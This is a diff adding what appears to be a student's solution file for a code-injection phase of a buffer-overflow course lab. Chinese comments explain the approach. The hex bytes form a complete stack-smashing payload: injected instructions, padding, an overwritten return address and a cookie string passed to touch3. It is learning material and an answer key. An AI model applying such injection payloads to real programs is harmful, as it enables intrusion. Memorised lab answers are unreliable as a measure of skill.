@@ -1,0 +1,26 @@
+/*
+Cookie: 0x59b997fa
+Ascii Representation: 61 66 37 39 39 62 39 35 (reversed)
+p3a.d:
+   0:	48 83 ec 10          	sub    $0x10,%rsp
+   4:	48 c7 c7 88 dc 61 55 	mov    $0x5561dc88,%rdi
+   b:	c3                   	retq   
+
+失败。不可以把该string存储在该栈内。没什么想法了
+!!!!!!!!!!!!!!
+参考笔记，观察复写的地址后面的栈，在结束touch3执行后没有改变! 可以把该字符串
+存储在上一个栈帧里头。
+   0:	48 8d 3c 24          	lea    (%rsp),%rdi
+   4:	68 fa 18 40 00       	pushq  $0x4018fa
+   9:	c3                   	retq   
+*/
+48 8d 3c 24 68 fa 18 40
+00 c3 00 00 00 00 00 00
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+fa 18 40 00 00 00 00 00 /* <touch3>的地址 */
+78 dc 61 55 00 00 00 00 
+/* 此行右端即为ret以后开始执行inject的代码时rsp所在位置，赋值给%rdi,
+pushq + ret跳转到touch3即可 */
+35 39 62 39 39 37 66 61 
+00 f3 f3 f3
